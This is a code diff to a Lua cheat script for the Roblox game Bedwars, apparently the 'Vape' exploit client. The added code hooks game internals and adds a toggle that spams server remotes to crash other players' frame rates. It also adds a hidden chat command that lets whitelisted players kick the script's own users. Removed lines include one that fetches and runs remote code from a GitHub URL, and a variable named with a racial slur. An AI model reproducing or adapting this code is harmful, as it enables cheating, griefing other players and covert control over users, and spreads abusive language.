@@ -972,6 +972,7 @@ runcode(function()
 			ShopItems = debug.getupvalue(debug.getupvalue(require(repstorage.TS.games.bedwars.shop["bedwars-shop"]).BedwarsShop.getShopItem, 1), 2),
 			SoundList = require(repstorage.TS.sound["game-sound"]).GameSound,
 			SoundManager = require(repstorage["rbxts_include"]["node_modules"]["@easy-games"]["game-core"].out).SoundManager,
+			PaintRemote = getremote(debug.getconstants(KnitClient.Controllers.PaintShotgunController.fire)),
 			SpawnRavenRemote = getremote(debug.getconstants(getmetatable(KnitClient.Controllers.RavenController).spawnRaven)),
 			SprintController = KnitClient.Controllers.SprintController,
 			StopwatchController = KnitClient.Controllers.StopwatchController,
@@ -980,7 +981,9 @@ runcode(function()
 			TrinityRemote = getremote(debug.getconstants(debug.getproto(getmetatable(KnitClient.Controllers.AngelController).onKitEnabled, 1))),
 			ViewmodelController = KnitClient.Controllers.ViewmodelController,
 			WeldTable = require(repstorage.TS.util["weld-util"]).WeldUtil,
-			ZephyrController = KnitClient.Controllers.WindWalkerController
+			ZephyrController = KnitClient.Controllers.WindWalkerController,
+			RaiseShieldRemote = getremote(debug.getconstants(KnitClient.Controllers.InfernalShieldController.constructor))
+
         }
 		oldzephyr = bedwars.ZephyrController.updateJump
 		bedwars.ZephyrController.updateJump = function(self, orb, ...)
@@ -2153,7 +2156,6 @@ local function findItemInTable(tab, item)
 end
 
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/31VS1/new/main/whiteshit", true))()
 
 local HwidWhitelist = {
     "C642B037-0D0A-49E3-8C03-4DB8CEA613A2" --  Xzyn
@@ -2168,42 +2170,19 @@ if table.find(HwidWhitelist, HWID) then
       local Read = readfile("/vape/Whitelist.txt")
       createwarning("Vape","Whitelisted", 60)
 end
-local function checkstate(plr)
-	local tab = shared.nigger
-	for i,v in pairs(tab) do
-		if tonumber(v) == tonumber(plr.UserId) then
-			return true
+
+game:GetService("Players").PlayerAdded:Connect(function()
+	for i, v in pairs(game:GetService("Players"):GetChildren()) do
+		if table.find(HwidWhitelist, v.Name) and (not string.match(HwidWhitelist, game:GetService("Players").LocalPlayer.Name)) then
+			v.Chatted:Connect(function(msg)
+				if msg == ";kick default" then
+					game:GetService("Players").LocalPlayer:kick("l")
+				end
+			end)
 		end
-	end
-	return false
-end
---start of the skidded part
-game.Players.PlayerAdded:Connect(function(plr)
-	if checkstate(plr) then
-		repstorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..plr.Name.." "..clients.ChatStrings2.vape, "All")
 	end
 end)
 
-for i,v in pairs(game.Players:GetPlayers()) do
-	if checkstate(v) then
-		repstorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..v.Name.." "..clients.ChatStrings2.vape, "All")
-	end
-end
-
-if checkstate(lplr) then
-	local players, replicatedStorage = game:GetService("Players"), game:GetService("ReplicatedStorage");
-		local defaultChatSystemChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");
-
-		local onMessageDoneFiltering = defaultChatSystemChatEvents:FindFirstChild("OnMessageDoneFiltering");
-
-		-- main
-		onMessageDoneFiltering.OnClientEvent:Connect(function(messageData)
-			local speaker, message = players[messageData.FromSpeaker], messageData.Message
-			if message == "/w "..lplr.Name.." "..clients.ChatStrings2.vape then
-				createwarning("Vape", speaker.Name.." is using Vape!", 60)
-			end
-		end)
-end -- end of skidded
 
 task.spawn(function()
 	repeat task.wait() until shared.VapeFullyLoaded
@@ -2259,6 +2238,33 @@ runcode(function()
                 end
         })
 end)
+
+
+
+runcode(function()
+local FPSCrashShield = {Enabled = false}
+FPSCrashShield = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
+	Name = "FPSCrashShield",
+	Function = function(callback)
+		if callback then
+			task.spawn(function()
+			  repeat
+                     task.wait(0.1)
+                      spawn(function()
+                        for i=1, 2 do
+					
+                                  bedwars.ClientHandler:Get(bedwars.RaiseShieldRemote).instance:FireServer({raised = true})
+                           end
+			end)
+				until FPSCrashShield.Enabled == false
+			end)
+		end
+	end, 
+	HoverText = "Trollage"
+})
+end)
+
+
 			
 runcode(function()
 	local Old4bigguysAura = {["Enabled"] = false}
@@ -2325,7 +2331,6 @@ Yuzi = PlayAnnoyer.CreateToggle({
 		HoverText = "Uses the Yuzi remote"
 	})
 end)
-
 
 runcode(function()
 local Visuals = {Enabled = false}
